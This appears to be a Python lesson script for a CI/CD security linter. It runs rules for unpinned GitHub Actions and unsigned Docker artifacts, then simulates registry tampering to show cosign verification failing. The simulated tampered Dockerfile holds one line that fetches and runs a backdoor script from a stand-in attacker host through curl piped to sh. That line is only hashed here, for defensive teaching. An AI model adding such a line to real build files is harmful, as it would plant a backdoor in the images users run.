#!/usr/bin/env python3
"""
Runs the REAL Zenith Engine rules for R1007 (engine/rules/actions.py) and
R1010 (engine/rules/artifacts.py). R1008 normally calls the GitHub API (one
GET per action) to confirm it exists; here it's replaced with a
deterministic local mock so the lesson works offline -- explicitly labeled
as a mock, not the real R1008 code.

It also simulates what happens to the integrity of an unsigned Docker
artifact versus one signed with cosign.
"""
import hashlib
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from engine.parser import parse_workflow, find_line
from engine.rules.actions import check_unverified_action_1007
from engine.rules.artifacts import check_missing_artifact_verification_1010

# Mock of "which actions actually exist" instead of calling the real GitHub
# API (so R1008 doesn't depend on network access or rate limits for this
# lesson).
KNOWN_EXISTING_ACTIONS = {
    'actions/checkout', 'actions/setup-node', 'docker/build-push-action', 'docker/login-action',
    'sigstore/cosign-installer', 'totally-random-dev/dockerfile-lint-action',
}


def print_alert(alert):
    print(f"  [{alert['severity']:8s}] {alert['rule_id']}  line {alert['line']}: {alert['description']}")


def check_action_not_in_marketplace_mock(workflow, lines):
    """Same criterion as the real R1008, but against KNOWN_EXISTING_ACTIONS
    instead of an HTTP call to api.github.com/repos/.../action.yml."""
    alerts = []
    for job_name, job in workflow.get('jobs', {}).items():
        for step in job.get('steps', []):
            uses = step.get('uses', '')
            if not uses or uses.startswith('./') or '/' not in uses:
                continue
            action = uses.split('@')[0] if '@' in uses else uses
            if action not in KNOWN_EXISTING_ACTIONS:
                alerts.append({
                    'rule_id': 'R1008 (offline mock)', 'severity': 'LOW',
                    'line': find_line(lines, uses),
                    'description': f'"{action}" was not found in the mock of known actions (typo? typosquatting?).',
                })
    return alerts


def analyze(path):
    print(f'\n=== {path.name} ===')
    workflow, lines = parse_workflow(str(path))

    alerts = (
        check_unverified_action_1007(workflow, lines, lang='en')
        + check_action_not_in_marketplace_mock(workflow, lines)
        + check_missing_artifact_verification_1010(workflow, lines, lang='en')
    )
    if not alerts:
        print('  No AIW findings.')
        return
    for alert in sorted(alerts, key=lambda a: a['line']):
        print_alert(alert)


def simulate_artifact_tampering():
    print('\n=== Simulation: integrity of the published artifact ===')

    original = b'FROM ubuntu:24.04\nCOPY app /app\nENTRYPOINT ["/app"]\n'
    tampered = b'FROM ubuntu:24.04\nCOPY app /app\nRUN curl -s https://attacker.example/backdoor.sh | sh\nENTRYPOINT ["/app"]\n'

    digest_build_time = hashlib.sha256(original).hexdigest()
    digest_after_tampering = hashlib.sha256(tampered).hexdigest()

    print('  Image digest at build time (cosign signs THIS digest):')
    print(f'    sha256:{digest_build_time}')
    print('  Image digest after a simulated registry tampering:')
    print(f'    sha256:{digest_after_tampering}')

    print('\n  Unsigned (vulnerable.yml):')
    print('    docker pull myorg/myimage:latest   -> succeeds, no warning at all. The tampered image is used anyway.')

    print('\n  Signed with cosign (fixed.yml):')
    if digest_build_time != digest_after_tampering:
        print('    cosign verify myorg/myimage@sha256:<digest_currently_in_the_registry>')
        print('    -> the signed digest does not match the published digest: VERIFICATION FAILED, the image is rejected.')


def main():
    base = Path(__file__).parent
    analyze(base / 'vulnerable.yml')
    analyze(base / 'fixed.yml')
    simulate_artifact_tampering()


if __name__ == '__main__':
    sys.exit(main())
